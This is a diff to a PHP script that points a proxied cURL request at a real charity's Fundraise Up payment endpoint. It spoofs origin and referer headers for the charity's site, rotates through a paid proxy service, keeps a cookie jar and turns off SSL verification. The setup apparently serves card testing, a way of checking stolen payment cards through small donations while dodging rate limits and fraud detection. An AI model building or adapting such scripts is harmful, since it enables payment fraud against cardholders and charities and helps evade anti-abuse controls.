@@ -271,7 +271,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, '#');
+curl_setopt($ch, CURLOPT_URL, 'https://api.fundraiseup.com/paymentSession/1387587213284476812/pay');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -282,16 +282,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: ',
+'authority: api.fundraiseup.com',
 'method: POST',
-'path: ',
+'path: /paymentSession/1387587213284476812/pay',
 'scheme: https',
 'accept: application/json, text/plain, */*',
-'accept-language: en-US,en;q=0.9',
-'content-type: application/json;charset=UTF-8',
+'accept-language: en-US,en;q=0.5',
+'content-type:text/plain; charset=utf-8',
 'cookie: ',
-'origin: ',
-'referer: ',
+'origin: https://thewaterproject.org',
+'referer: https://thewaterproject.org/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
